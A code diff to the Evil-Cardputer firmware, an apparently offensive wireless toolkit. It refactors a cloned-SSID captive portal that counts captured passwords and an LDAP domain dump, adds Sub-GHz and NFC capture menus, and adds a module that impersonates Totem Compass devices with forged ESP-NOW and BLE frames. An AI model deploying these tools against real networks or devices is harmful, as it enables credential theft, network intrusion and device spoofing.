@@ -194,8 +194,22 @@ struct TtTagProfile;
 struct TtImagePayload;
 struct TtBitWriter;
 struct TtMenuItem;
+struct TotemRxFrame;
+struct TotemPeer;
+struct TotemRecent;
+struct TotemBleFrame;
 void tagTinkerMenu();
 void csiRadarMenu();
+void totemCompassMenu();
+void keyRelease();
+void subGhzMenu();
+void nfcMenu();
+struct SubGhzDecoded;
+struct SubGhzProto;
+struct Crypto1State;
+struct SubGhzDecState;
+struct NfcCardInfo;
+struct EmvCard;
 bool tt_handle_serial(const String& command);
 String tt_get_tags_json();
 void ttAddTag(const String& bc, const String& name);
@@ -344,6 +358,9 @@ static const char * const PROGMEM menuItems[] = {
   "CIW Zeroclick",
   "TagTinker ESL",
   "CSI Radar",
+  "Totem Compass",
+  "Cap Sub-GHz",
+  "Cap NFC",
   "Settings",
 };
 
@@ -989,6 +1006,7 @@ String ipAddress = "";
 #include <BLEDevice.h>
 #include <BLEUtils.h>
 #include <BLEServer.h>
+#include <BLE2902.h>
 #include "BLEHIDDevice.h"
 #include "HIDTypes.h"
 
@@ -1017,15 +1035,11 @@ static bool isBLEInitialized = false;
 void releaseBLE() {
   BLEScan* pBLEScan = BLEDevice::getScan();
   if (pBLEScan) {
-    pBLEScan->stop();   // 🔥 stoppe tout scan actif
+    pBLEScan->stop();
   }
-  // Si BLE n'a jamais été init, on ne libère pas
   if (!isBLEInitialized) return;
-
-  // Désactive proprement le device BLE
-  BLEDevice::deinit();
-
-  isBLEInitialized = false;
+  BLEDevice::getAdvertising()->stop();
+  // Keep BT controller alive — deinit corrupts coex on ESP-IDF 4.4
 }
 
 
@@ -2032,7 +2046,7 @@ void setup() {
   // Textes à afficher
   const char* text1 = "Evil-Cardputer";
   const char* text2 = "By 7h30th3r0n3";
-  const char* text3 = "v1.5.4 2026";
+  const char* text3 = "v1.5.5 2026";
 
   // Mesure de la largeur du texte et calcul de la position du curseur
   int text1Width = M5.Lcd.textWidth(text1);
@@ -2062,7 +2076,7 @@ void setup() {
   Serial.println(F("-------------------"));
   Serial.println(F("Evil-Cardputer"));
   Serial.println(F("By 7h30th3r0n3"));
-  Serial.println(F("v1.5.4 2026"));
+  Serial.println(F("v1.5.5 2026"));
   Serial.println(F("-------------------"));
   // Diviser randomMessage en deux lignes pour s'adapter à l'écran
   int maxCharsPerLine = screenWidth / 10;  // Estimation de 10 pixels par caractère
@@ -2213,8 +2227,9 @@ bool pageAccessFlag = false;
 
 int getConnectedPeopleCount() {
   wifi_sta_list_t stationList;
-  esp_wifi_ap_get_sta_list(&stationList);
-  return stationList.num; // Retourne le nombre de clients connectés
+  memset(&stationList, 0, sizeof(stationList));
+  if (esp_wifi_ap_get_sta_list(&stationList) != ESP_OK) return 0;
+  return max(0, (int)stationList.num);
 }
 
 int getCapturedPasswordsCount() {
@@ -2741,7 +2756,10 @@ void executeMenuItem(int index) {
     case 85: ciwZeroclickMenu(); break;
     case 86: tagTinkerMenu(); break;
     case 87: csiRadarMenu(); break;
-    case 88: showSettingsMenu(); break;
+    case 88: totemCompassMenu(); break;
+    case 89: subGhzMenu(); break;
+    case 90: nfcMenu(); break;
+    case 91: showSettingsMenu(); break;
   }
   isOperationInProgress = false;
 }
@@ -2763,6 +2781,15 @@ void backDebounce() {
   // Use hardware keyboard directly — virtual keys must NOT be consumed here
   while (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
     cardUpdate();
+    delay(10);
+  }
+}
+
+void keyRelease() {
+  unsigned long t = millis();
+  while (millis() - t < 300) {
+    M5.update(); cardUpdate();
+    if (!M5Cardputer.Keyboard.isPressed()) return;
     delay(10);
   }
 }
@@ -3892,41 +3919,53 @@ void servePortalFileWithReplace(const String &path, const String &replaceIP) {
 
 void createCaptivePortal() {
   String ssid = clonedSSID.isEmpty() ? "Evil-M5Core2" : clonedSSID;
-  // Vérification de la connexion Wi-Fi et mise à jour des variables
+  if (ssid.length() < 2) {
+    Serial.printf("[PORTAL] SSID '%s' too short, using default\n", ssid.c_str());
+    ssid = "Evil-Cardputer";
+  }
+
+  Serial.printf("[PORTAL] heap=%u SSID='%s' karma=%d\n",
+                ESP.getFreeHeap(), ssid.c_str(), isAutoKarmaActive);
 
   if (!isAutoKarmaActive) {
-    // Choix du mode AP ou AP+STA selon l'IP actuelle
+    wifi_mode_t prevMode;
+    esp_wifi_get_mode(&prevMode);
+    Serial.printf("[PORTAL] prev WiFi mode=%d\n", prevMode);
+
     if (WiFi.localIP().toString() == "0.0.0.0") {
       WiFi.mode(WIFI_MODE_AP);
     } else {
       WiFi.mode(WIFI_MODE_APSTA);
     }
-    
-   IPAddress apIP = getSelectedPortalIP();
+    // Force normal WiFi protocols on both interfaces (LR mode persists after Totem)
+    esp_wifi_set_protocol(WIFI_IF_AP, WIFI_PROTOCOL_11B|WIFI_PROTOCOL_11G|WIFI_PROTOCOL_11N);
+    esp_wifi_set_protocol(WIFI_IF_STA, WIFI_PROTOCOL_11B|WIFI_PROTOCOL_11G|WIFI_PROTOCOL_11N);
+
+    IPAddress apIP = getSelectedPortalIP();
     if (!WiFi.softAPConfig(apIP, apIP, IPAddress(255,255,255,0))) {
       Serial.println(F("[-] softAPConfig failed, keep default"));
     } else {
-      Serial.print(F("[CFG] AP IP = ")); Serial.println(apIP);
+      Serial.printf("[CFG] AP IP = %s\n", apIP.toString().c_str());
     }
-    
-    // Paramètres pour softAP()
-    const int  channel       = 1;     // canal Wi-Fi (1 à 13 selon norme)
-    const bool ssid_hidden   = false; // SSID visible
-    const int  max_clients   = 10;     // autoriser jusqu'à 10 clients
 
-    // Appel à 5 paramètres pour augmenter la limite
+    const int  channel       = 1;
+    const bool ssid_hidden   = false;
+    const int  max_clients   = 10;
+
+    bool ap_ok;
     if (captivePortalPassword.isEmpty()) {
-      WiFi.softAP(ssid.c_str(),       // SSID
-                  nullptr,            // pas de mot de passe
-                  channel, 
-                  ssid_hidden, 
-                  max_clients);
+      ap_ok = WiFi.softAP(ssid.c_str(), nullptr, channel, ssid_hidden, max_clients);
     } else {
-      WiFi.softAP(ssid.c_str(),                       // SSID
-                  captivePortalPassword.c_str(),     // mot de passe
-                  channel, 
-                  ssid_hidden, 
-                  max_clients);
+      ap_ok = WiFi.softAP(ssid.c_str(), captivePortalPassword.c_str(), channel, ssid_hidden, max_clients);
+    }
+    uint8_t ap_proto = 0;
+    esp_wifi_get_protocol(WIFI_IF_AP, &ap_proto);
+    Serial.printf("[PORTAL] softAP %s heap=%u proto=0x%02X ch=%d IP=%s\n",
+                  ap_ok ? "OK" : "FAIL", ESP.getFreeHeap(), ap_proto,
+                  WiFi.channel(), WiFi.softAPIP().toString().c_str());
+    if (!ap_ok) {
+      Serial.println(F("[PORTAL] softAP FAILED — trying with defaults"));
+      WiFi.softAP(ssid.c_str());
     }
   }
 
@@ -9872,9 +9911,9 @@ Wardriving
 
 String createPreHeader() {
   String preHeader = "WigleWifi-1.4";
-  preHeader += ",appRelease=v1.5.4"; // Remplacez [version] par la version de votre application
+  preHeader += ",appRelease=v1.5.5"; // Remplacez [version] par la version de votre application
   preHeader += ",model=Cardputer";
-  preHeader += ",release=v1.5.4"; // Remplacez [release] par la version de l'OS de l'appareil
+  preHeader += ",release=v1.5.5"; // Remplacez [release] par la version de l'OS de l'appareil
   preHeader += ",device=Evil-Cardputer"; // Remplacez [device name] par un nom de périphérique, si souhaité
   preHeader += ",display=7h30th3r0n3"; // Ajoutez les caractéristiques d'affichage, si pertinent
   preHeader += ",board=M5Cardputer";
@@ -14922,11 +14961,10 @@ void initBluetoothKeyboard() {
 // Fonction pour nettoyer et désactiver le Bluetooth
 void cleanupBluetooth() {
     if (isBluetoothKeyboardActive) {
-        Serial.println(F("Disabling Bluetooth..."));
-
-        BLEDevice::deinit();  // Désactiver toutes les activités Bluetooth
-        isBluetoothKeyboardActive = false;  // Désactiver le mode clavier Bluetooth
-        Serial.println(F("Bluetooth disabled."));
+        Serial.println(F("Disabling Bluetooth keyboard..."));
+        BLEDevice::getAdvertising()->stop();
+        isBluetoothKeyboardActive = false;
+        Serial.println(F("Bluetooth keyboard disabled."));
     }
 }
 
@@ -15047,7 +15085,7 @@ unsigned long lastLog = 0;
 int currentScreen   = 1;  // 1=GeneralInfo, 2=ReceivedData
 
 const String wigleHeaderFileFormat =
-  "WigleWifi-1.4,appRelease=v1.5.4,model=Cardputer,release=v1.5.4,"
+  "WigleWifi-1.4,appRelease=v1.5.5,model=Cardputer,release=v1.5.5,"
   "device=Evil-Cardputer,display=7h30th3r0n3,board=M5Cardputer,brand=M5Stack";
 
 char* log_col_names[LOG_COLUMN_COUNT] = {
@@ -15441,8 +15479,7 @@ char lastSSIDMasterSniffer[33] = "";
 
 typedef struct { uint8_t data[ESPNOW_MAX_DATA_LEN]; uint8_t len; } frag_item_t;
 
-/* >>> le tableau n’est plus volatile <<< */
-static frag_item_t q[QUEUE_LEN];
+static frag_item_t* q = nullptr;
 
 /* seuls les index sont volatiles (partagés ISR / main) */
 volatile uint8_t qHead = 0, qTail = 0;
@@ -15643,6 +15680,10 @@ void sniffMaster(){
   Serial.println(F(">> SniffMaster v3 (queue RAM)"));
   enterDebounce();
 
+  q = (frag_item_t*)malloc(QUEUE_LEN * sizeof(frag_item_t));
+  if (!q) { waitAndReturnToMenu("Frag alloc failed"); return; }
+  memset(q, 0, QUEUE_LEN * sizeof(frag_item_t));
+
   memset(received_len,0,sizeof(received_len));
   memset(next_frag,  0,sizeof(next_frag));
   memset(received_frames,0,sizeof(received_frames));
@@ -15673,6 +15714,7 @@ void sniffMaster(){
   }
   esp_now_unregister_recv_cb(); esp_now_deinit();
   if(pcapFile) pcapFile.close();
+  free(q); q = nullptr;
   waitAndReturnToMenu("Returning to menu...");
 }
 
@@ -31455,9 +31497,8 @@ String ldapDomainNetbios = "";
 String ldapUsername = "";
 String ldapPassword = "";
 
-// Gros buffer global pour les réponses LDAP (évite l'overflow de stack)
-static const int LDAP_BUF_SIZE = 8192;   // 8 Ko
-static uint8_t ldapRespBuf[LDAP_BUF_SIZE];  // alloué en .bss, pas sur la stack
+static const int LDAP_BUF_SIZE = 8192;
+static uint8_t* ldapRespBuf = nullptr;
 
 // ─────────────────────────────────────────────
 // Sanitize LDAP strings → keep only printable chars
@@ -32517,7 +32558,7 @@ void ldapSearchPagedLoop(const IPAddress &dcIP,
         cli.write(pkt, pktLen);
 
         int respLen = 0;
-        memset(ldapRespBuf, 0, sizeof(ldapRespBuf));
+        memset(ldapRespBuf, 0, LDAP_BUF_SIZE);
 
         uint32_t t0 = millis();
         while (millis() - t0 < 2000) {  // 2s de fenêtre
@@ -33106,12 +33147,15 @@ void ldapExtractAndSave(
 // Routine complète d’extraction LDAP
 // ─────────────────────────────────────────────
 void runLDAPDomainDump() {
+    ldapRespBuf = (uint8_t*)malloc(LDAP_BUF_SIZE);
+    if (!ldapRespBuf) { waitAndReturnToMenu("LDAP alloc failed"); return; }
+
     IPAddress dcIP;
 
     // 1) Détection + Bind (fonction existante)
     if (!detectAndBindToDC(dcIP)) {
-        // On log l’erreur dans la console si elle est déjà à l’écran
         ldapUiLogLine("[ERROR] DetectAndBindToDC() failed.");
+        free(ldapRespBuf); ldapRespBuf = nullptr;
         waitAndReturnToMenu("LDAP Bind failed");
         return;
     }
@@ -33304,7 +33348,7 @@ void runLDAPDomainDump() {
     // Laisser l'utilisateur consulter les logs (scroll ';' / '.' / BACKSPACE)
     ldapUiShowViewer();
 
-    // Retour au menu principal Evil
+    free(ldapRespBuf); ldapRespBuf = nullptr;
     waitAndReturnToMenu("LDAP Dump done");
 }
 
@@ -39039,6 +39083,7 @@ void csiRadarLoop(const char* mode_label, bool multi_beacon) {
     if (multi_beacon) esp_now_deinit();
     esp_wifi_set_promiscuous(false);
     WiFi.disconnect();
+    esp_wifi_set_protocol(WIFI_IF_STA, WIFI_PROTOCOL_11B|WIFI_PROTOCOL_11G|WIFI_PROTOCOL_11N);
     WiFi.mode(WIFI_OFF);
     delay(50);
 }
@@ -39108,6 +39153,7 @@ void csiRadarMenu() {
             M5.Display.setTextColor(TFT_RED, TFT_BLACK);
             M5.Display.print("ESP-NOW init failed!");
             M5.Display.display(); delay(2000);
+            esp_wifi_set_protocol(WIFI_IF_STA, WIFI_PROTOCOL_11B|WIFI_PROTOCOL_11G|WIFI_PROTOCOL_11N);
             WiFi.mode(WIFI_OFF); inMenu = true; return;
         }
 
@@ -39145,6 +39191,7 @@ void csiRadarMenu() {
             if (kp(KEY_BACKSPACE)) {
                 esp_now_deinit(); esp_wifi_set_csi(false);
                 esp_wifi_set_promiscuous(false);
+                esp_wifi_set_protocol(WIFI_IF_STA, WIFI_PROTOCOL_11B|WIFI_PROTOCOL_11G|WIFI_PROTOCOL_11N);
                 WiFi.mode(WIFI_OFF); inMenu = true; return;
             }
             M5.Display.fillRect(10, 55, 220, 30, TFT_BLACK);
@@ -39167,6 +39214,7 @@ void csiRadarMenu() {
             M5.Display.display(); delay(2000);
             esp_now_deinit(); esp_wifi_set_csi(false);
             esp_wifi_set_promiscuous(false);
+            esp_wifi_set_protocol(WIFI_IF_STA, WIFI_PROTOCOL_11B|WIFI_PROTOCOL_11G|WIFI_PROTOCOL_11N);
             WiFi.mode(WIFI_OFF); inMenu = true; return;
         }
 
@@ -39217,6 +39265,7 @@ void csiRadarMenu() {
             M5.Display.display();
             while (true) {
                 M5.update(); cardUpdate();
+                esp_wifi_set_protocol(WIFI_IF_STA, WIFI_PROTOCOL_11B|WIFI_PROTOCOL_11G|WIFI_PROTOCOL_11N);
                 if (kp(KEY_BACKSPACE)) { WiFi.mode(WIFI_OFF); inMenu = true; return; }
                 if (kp(KEY_ENTER)) break;
                 delay(10);
@@ -39229,6 +39278,7 @@ void csiRadarMenu() {
                 }
             }
             WiFi.scanDelete();
+            esp_wifi_set_protocol(WIFI_IF_STA, WIFI_PROTOCOL_11B|WIFI_PROTOCOL_11G|WIFI_PROTOCOL_11N);
             if (beacon_found == 0) { WiFi.mode(WIFI_OFF); inMenu = true; return; }
         }
 
@@ -39244,6 +39294,7 @@ void csiRadarMenu() {
         unsigned long t0 = millis();
         while (WiFi.status() != WL_CONNECTED && millis() - t0 < 8000) {
             delay(100); M5.update(); cardUpdate();
+            esp_wifi_set_protocol(WIFI_IF_STA, WIFI_PROTOCOL_11B|WIFI_PROTOCOL_11G|WIFI_PROTOCOL_11N);
             if (kp(KEY_BACKSPACE)) { WiFi.disconnect(); WiFi.mode(WIFI_OFF); inMenu = true; return; }
         }
         if (WiFi.status() != WL_CONNECTED) {
@@ -39251,6 +39302,7 @@ void csiRadarMenu() {
             M5.Display.setCursor(10, 70);
             M5.Display.print("Connection FAILED!");
             M5.Display.display(); delay(2000);
+            esp_wifi_set_protocol(WIFI_IF_STA, WIFI_PROTOCOL_11B|WIFI_PROTOCOL_11G|WIFI_PROTOCOL_11N);
             WiFi.disconnect(); WiFi.mode(WIFI_OFF); inMenu = true; return;
         }
 
@@ -39277,6 +39329,7083 @@ void csiRadarMenu() {
     M5.Display.clear(menuBackgroundColor);
     inMenu = true;
 }
+
+
+
+
+// =====================================================================
+// =================== Totem Compass Protocol ========================
+// =====================================================================
+// Rewritten from TotemCardputer(1).ino reference (tested working)
+// ESP-NOW WiFi Long-Range, channel 6, Totem Compass protocol
+// FreeRTOS queue RX, exact beacon/mesh format from reference
+// =====================================================================
+
+#include <esp_now.h>
+#include <esp_wifi.h>
+#include <Preferences.h>
+#include <freertos/queue.h>
+
+#define TOTEM_MAX_PEERS 32
+#define TOTEM_PEER_TIMEOUT 60000
+#define TOTEM_TX_INTERVAL 800
+#define TOTEM_CHANNEL 6
+#define TOTEM_DEVICE_NAME "Evil-Cardputer"
+#define TOTEM_PAIR_SECS 60
+#define TOTEM_BONDING_RSSI -55
+#define TOTEM_MESH_TX_MS 6000
+#define TOTEM_MESH_HOPS 5
+#define TOTEM_EXT_CATEGORY   0x7E
+#define TOTEM_EXT_ACK        1
+#define TOTEM_EXT_CAP_QUERY  3
+#define TOTEM_EXT_CAP_REPORT 4
+#define TOTEM_ACK_STARTED    2
+#define TOTEM_DG_RSSI_MIN    (-100)
+#define TOTEM_DG_FIND_SECS   15
+#define TOTEM_DG_DELAY_SEC   6
+#define TOTEM_SMART_GROUP_RSSI (-60)
+#define TOTEM_CAP_FIND_ACK     (1UL << 0)
+#define TOTEM_CAP_PAIRING      (1UL << 3)
+#define TOTEM_CAP_SMART_GROUP  (1UL << 5)
+#define TOTEM_LOCAL_CAPS (TOTEM_CAP_FIND_ACK|TOTEM_CAP_PAIRING|TOTEM_CAP_SMART_GROUP)
+
+static const uint8_t TOTEM_MAGIC[2] = {0xA7, 0x74};
+static const uint8_t TOTEM_BCAST[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+static const uint8_t TOTEM_ZERO[6] = {0,0,0,0,0,0};
+
+struct TotemRxFrame {
+    uint8_t mac[6];
+    int8_t rssi;
+    uint32_t receivedAt;
+    uint16_t len;
+    uint8_t data[250];
+};
+
+struct TotemPeer {
+    uint8_t mac[6];
+    float lat, lon;
+    int rssi;
+    int8_t sos;
+    uint8_t cat;
+    char name[21];
+    bool bonded;
+    bool active;
+    unsigned long last_seen;
+    float distance;
+    float bearing;
+    uint8_t hops;
+};
+
+static TotemPeer totem_peers[TOTEM_MAX_PEERS];
+int totem_peer_count = 0;
+bool totem_running = false;
+bool totem_sos = false;
+static unsigned long totem_pair_until = 0;
+uint8_t totem_my_mac[6];
+static QueueHandle_t totem_rx_queue = nullptr;
+
+bool totem_bond_latched = false;
+uint8_t totem_bond_mac[6] = {};
+
+struct TotemStats {
+    uint32_t rx, relayed, bonds, meshTx, pairRx, pairTx;
+} totem_stats;
+
+struct TotemRecent {
+    uint16_t tail;
+    uint32_t expires;
+};
+static TotemRecent totem_recent[64];
+size_t totem_recent_cursor = 0;
+uint32_t totem_flash_until = 0;
+uint16_t totem_flash_color = 0xFFFF;
+uint32_t totem_cap_nonce = 0;
+uint16_t totem_group_uid = 0;
+uint32_t totem_group_until = 0;
+uint8_t totem_dg_color = 0;
+const uint8_t TOTEM_DG_COLORS[][3] = {
+    {0xFF,0x40,0x00}, {0x00,0xFF,0x00}, {0x00,0x00,0xFF},
+    {0xFF,0xFF,0xFF}, {0xFF,0x00,0xFF}, {0xFF,0xFF,0x00}
+};
+
+// ── BLE Totem state (impersonate real Totem for mobile app) ──
+struct TotemBleFrame { uint16_t len; uint8_t data[250]; };
+bool totem_ble_connected = false;
+volatile bool totem_ble_static_requested = false;
+uint8_t totem_ble_conn_mode = 0;
+uint8_t totem_ble_frame_schema = 0;
+BLECharacteristic* totem_ble_status_char = nullptr;
+BLECharacteristic* totem_ble_data_char = nullptr;
+QueueHandle_t totem_ble_rx_queue = nullptr;
+QueueHandle_t totem_ble_tx_queue = nullptr;
+TaskHandle_t totem_ble_tx_task = nullptr;
+uint32_t totem_ble_last_peer_sync = 0;
+bool totem_ble_active = false;
+
+// ── Helpers ──
+
+void totemPutF(uint8_t *b, size_t o, float v)    { memcpy(b+o, &v, 4); }
+void totemPutI32(uint8_t *b, size_t o, int32_t v) { memcpy(b+o, &v, 4); }
+void totemPutU32(uint8_t *b, size_t o, uint32_t v){ memcpy(b+o, &v, 4); }
+void totemPutI16(uint8_t *b, size_t o, int16_t v) { memcpy(b+o, &v, 2); }
+void totemPutU16(uint8_t *b, size_t o, uint16_t v){ memcpy(b+o, &v, 2); }
+float   totemGetF(const uint8_t *b, size_t o) { float v;   memcpy(&v, b+o, 4); return v; }
+int32_t totemGetI32(const uint8_t *b, size_t o){ int32_t v; memcpy(&v, b+o, 4); return v; }
+uint32_t totemGetU32(const uint8_t *b, size_t o){uint32_t v;memcpy(&v, b+o, 4); return v; }
+int16_t totemGetI16(const uint8_t *b, size_t o){ int16_t v; memcpy(&v, b+o, 2); return v; }
+uint16_t totemGetU16(const uint8_t *b, size_t o){uint16_t v;memcpy(&v, b+o, 2); return v; }
+
+float totem_get_distance(float lat1, float lon1, float lat2, float lon2) {
+    float dlat = (lat2 - lat1) * 0.017453292f;
+    float dlon = (lon2 - lon1) * 0.017453292f;
+    float a = sinf(dlat/2)*sinf(dlat/2) +
+              cosf(lat1*0.017453292f)*cosf(lat2*0.017453292f)*sinf(dlon/2)*sinf(dlon/2);
+    return 6371000.0f * 2.0f * atan2f(sqrtf(a), sqrtf(1.0f-a));
+}
+
+float totem_get_azimuth(float lat1, float lon1, float lat2, float lon2) {
+    float dlon = (lon2 - lon1) * 0.017453292f;
+    float y = sinf(dlon) * cosf(lat2 * 0.017453292f);
+    float x = cosf(lat1*0.017453292f)*sinf(lat2*0.017453292f) -
+              sinf(lat1*0.017453292f)*cosf(lat2*0.017453292f)*cosf(dlon);
+    return fmodf(atan2f(y,x)*57.29578f + 360.0f, 360.0f);
+}
+
+const char* totem_dir_str(float bearing) {
+    if (bearing < 22.5 || bearing >= 337.5) return "N";
+    if (bearing < 67.5) return "NE";
+    if (bearing < 112.5) return "E";
+    if (bearing < 157.5) return "SE";
+    if (bearing < 202.5) return "S";
+    if (bearing < 247.5) return "SW";
+    if (bearing < 292.5) return "W";
+    return "NW";
+}
+
+bool totem_seen_recent(uint16_t tail) {
+    uint32_t now = millis();
+    for (auto &entry : totem_recent) {
+        if (entry.tail == tail && (int32_t)(entry.expires - now) > 0) return true;
+    }
+    totem_recent[totem_recent_cursor] = {tail, now + 30000};
+    totem_recent_cursor = (totem_recent_cursor + 1) % 64;
+    return false;
+}
+
+int totem_find_peer(const uint8_t* mac) {
+    for (int i = 0; i < totem_peer_count; i++)
+        if (memcmp(totem_peers[i].mac, mac, 6) == 0) return i;
+    if (totem_peer_count >= TOTEM_MAX_PEERS) return -1;
+    int idx = totem_peer_count++;
+    memset(&totem_peers[idx], 0, sizeof(TotemPeer));
+    memcpy(totem_peers[idx].mac, mac, 6);
+    totem_peers[idx].rssi = -127;
+    return idx;
+}
+
+void totem_add_espnow_peer(const uint8_t* mac) {
+    if (!esp_now_is_peer_exist(mac)) {
+        esp_now_peer_info_t p = {};
+        memcpy(p.peer_addr, mac, 6);
+        p.channel = TOTEM_CHANNEL;
+        p.encrypt = false;
+        p.ifidx = WIFI_IF_STA;
+        esp_now_add_peer(&p);
+    }
+}
+
+bool totem_send(const uint8_t* mac, const uint8_t* data, size_t len) {
+    if (!esp_now_is_peer_exist(mac)) totem_add_espnow_peer(mac);
+    return esp_now_send(mac, data, len) == ESP_OK;
+}
+
+// ── Beacon builders (exact match to reference TotemCardputer.ino) ──
+
+size_t totem_build_beacon(uint8_t* b, uint8_t cmd, uint8_t ack,
+                          float lat, float lon, const uint8_t* target) {
+    const size_t nameLen = strlen(TOTEM_DEVICE_NAME);
+    const size_t len = 71 + nameLen + 5;
+    memset(b, 0, len);
+    b[0] = 0xA7; b[1] = 0x74; b[2] = 0; b[3] = cmd;
+    totemPutF(b, 4, lat);
+    totemPutF(b, 8, lon);
+    b[12] = 0xFF; b[13] = 0;
+    totemPutI16(b, 14, 0);  // azimuth always 0 (reference convention)
+    b[16] = totem_sos ? 1 : 0;
+    b[17] = 2; b[18] = ack;
+    // target MAC at offset 19 = always ZERO (reference: never sets peer MAC here)
+    totemPutI16(b, 25, 0);
+    totemPutI32(b, 27, -1);
+    totemPutI32(b, 31, -1);
+    b[35] = 1; b[36] = 5; b[37] = 1; b[38] = 0;
+    totemPutI16(b, 39, -500);
+    totemPutU16(b, 41, (uint16_t)(millis() / 60000));
+    totemPutF(b, 43, 0.0f);
+    totemPutI16(b, 47, 0);
+    totemPutI16(b, 49, 0);
+    totemPutF(b, 51, 0.0f);
+    totemPutF(b, 55, 0.0f);
+    b[59] = 0;
+    totemPutI32(b, 60, 0);
+    totemPutI32(b, 64, 0);
+    b[68] = 0; b[69] = 0; b[70] = (uint8_t)nameLen;
+    memcpy(b + 71, TOTEM_DEVICE_NAME, nameLen);
+    size_t o = 71 + nameLen;
+    b[o] = 0; b[o+1] = 1; totemPutU16(b, o+2, 0); b[o+4] = 100;
+    return len;
+}
+
+void totem_send_mesh(float lat, float lon) {
+    uint8_t b[45];
+    memset(b, 0, 45);
+    b[0] = 0xA7; b[1] = 0x74; b[2] = 2; b[3] = 0;
+    memcpy(b + 4, totem_my_mac, 6);
+    totemPutF(b, 10, lat);
+    totemPutF(b, 14, lon);
+    b[18] = 0xFF; b[19] = totem_sos ? 1 : 0;
+    uint16_t tail = (uint16_t)(esp_random() % 65534 + 1);
+    totemPutU16(b, 20, tail);
+    b[22] = 1; b[23] = (uint8_t)-127; b[24] = 0;
+    totemPutI16(b, 25, -1);
+    totemPutI16(b, 27, -1);
+    b[29] = 0; b[30] = TOTEM_MESH_HOPS;
+    totemPutI32(b, 31, 2000000000);
+    totemPutF(b, 35, lat);
+    totemPutF(b, 39, lon);
+    totemPutI16(b, 43, -1);
+    totem_seen_recent(tail);
+    if (totem_send(TOTEM_BCAST, b, 45)) totem_stats.meshTx++;
+}
+
+void totem_send_pair_beacon(const uint8_t* mac, bool ack) {
+    uint8_t buf[100];
+    float lat = gps.location.isValid() ? gps.location.lat() : 0;
+    float lon = gps.location.isValid() ? gps.location.lng() : 0;
+    // Target MAC in beacon = always ZERO (ref convention). Unicast via esp_now_send dest.
+    size_t n = totem_build_beacon(buf, 1, ack ? 1 : 0, lat, lon, nullptr);
+    totem_send(ack ? mac : TOTEM_BCAST, buf, n);
+    totem_stats.pairTx++;
+}
+
+void totem_send_position(float lat, float lon) {
+    uint8_t buf[100];
+    size_t n = totem_build_beacon(buf, 0, 0, lat, lon, nullptr);
+    totem_send(TOTEM_BCAST, buf, n);
+}
+
+// ── Bond persistence (NVS) ──
+void totem_save_bonds() {
+    Preferences prefs; prefs.begin("totem", false);
+    uint8_t blob[1 + 20 * 6] = {}; uint8_t cnt = 0;
+    for (int i = 0; i < totem_peer_count && cnt < 20; i++)
+        if (totem_peers[i].bonded) { memcpy(blob + 1 + cnt * 6, totem_peers[i].mac, 6); cnt++; }
+    blob[0] = cnt;
+    prefs.putBytes("bonds", blob, 1 + cnt * 6);
+    prefs.end();
+}
+void totem_load_bonds() {
+    Preferences prefs; prefs.begin("totem", true);
+    uint8_t blob[1 + 20 * 6] = {};
+    size_t n = prefs.getBytes("bonds", blob, sizeof(blob));
+    prefs.end();
+    if (!n) return;
+    uint8_t cnt = min((uint8_t)blob[0], (uint8_t)20);
+    for (uint8_t i = 0; i < cnt && 1 + (i+1)*6 <= n; i++) {
+        int idx = totem_find_peer(blob + 1 + i * 6);
+        if (idx >= 0) { totem_peers[idx].bonded = true; totem_add_espnow_peer(blob + 1 + i * 6); }
+    }
+}
+
+// ── Control ACK ──
+void totem_send_control_ack(const uint8_t* dest, uint8_t status, uint8_t orig_cat, uint8_t orig_cmd, uint16_t crc) {
+    uint8_t ack[10] = {0xA7, 0x74, TOTEM_EXT_CATEGORY, TOTEM_EXT_ACK, status, orig_cat, orig_cmd};
+    totemPutU16(ack, 7, crc); totem_send(dest, ack, 10);
+}
+
+// ── Capability Discovery ──
+void totem_send_cap_report(const uint8_t* dest, uint32_t nonce) {
+    uint8_t r[17] = {0xA7, 0x74, TOTEM_EXT_CATEGORY, TOTEM_EXT_CAP_REPORT, 5, 1, 0};
+    totemPutU32(r, 7, TOTEM_LOCAL_CAPS); r[11] = 100; r[12] = 0; totemPutU32(r, 13, nonce);
+    totem_send(dest, r, 17);
+}
+void totem_send_cap_query() {
+    totem_cap_nonce = esp_random(); if (!totem_cap_nonce) totem_cap_nonce = 1;
+    uint8_t q[8] = {0xA7, 0x74, TOTEM_EXT_CATEGORY, TOTEM_EXT_CAP_QUERY};
+    totemPutU32(q, 4, totem_cap_nonce); totem_send(TOTEM_BCAST, q, 8);
+}
+void totem_handle_extension(const TotemRxFrame& f) {
+    if (f.len < 4) return;
+    if (f.data[3] == TOTEM_EXT_CAP_QUERY && f.len >= 8) {
+        totem_send_cap_report(f.mac, totemGetU32(f.data, 4)); return;
+    }
+    if (f.data[3] == TOTEM_EXT_CAP_REPORT && f.len >= 17) {
+        uint32_t nonce = totemGetU32(f.data, 13);
+        if (totem_cap_nonce && nonce != totem_cap_nonce) return;
+        int p = totem_find_peer(f.mac);
+        if (p >= 0) totem_peers[p].cat = f.data[4];
+    }
+}
+
+// ── Handle Find (cat=1, cmd=5) ──
+uint16_t totem_crc16(const uint8_t* data, size_t len) {
+    uint16_t crc = 0xFFFF;
+    for (size_t i = 0; i < len; i++) {
+        crc ^= (uint16_t)data[i] << 8;
+        for (uint8_t b = 0; b < 8; b++) crc = (crc & 0x8000) ? (uint16_t)((crc << 1) ^ 0x1021) : (uint16_t)(crc << 1);
+    }
+    return crc;
+}
+void totem_handle_find(const TotemRxFrame& f) {
+    if (f.len < 29) return;
+    if (memcmp(f.data + 4, TOTEM_ZERO, 6) != 0 && memcmp(f.data + 4, totem_my_mac, 6) != 0) return;
+    if (f.rssi < (int8_t)f.data[13] || f.rssi > (int8_t)f.data[14]) return;
+    totem_flash_until = millis() + max((uint8_t)1, f.data[25]) * 1000UL;
+    totem_flash_color = M5.Display.color565(f.data[26], f.data[27], f.data[28]);
+    totem_send_control_ack(f.mac, TOTEM_ACK_STARTED, 1, 5, totem_crc16(f.data, f.len));
+}
+
+// ── DemiGod Find & Power ──
+void totem_send_dg_find(uint8_t dur) {
+    uint8_t m[29] = {0xA7, 0x74, 1, 5}; // cat=1, cmd=5
+    m[13] = (uint8_t)TOTEM_DG_RSSI_MIN;
+    for (int i = 15; i <= 24; i++) m[i] = 0xFF;
+    m[25] = max((uint8_t)1, dur);
+    m[26] = TOTEM_DG_COLORS[totem_dg_color][0];
+    m[27] = TOTEM_DG_COLORS[totem_dg_color][1];
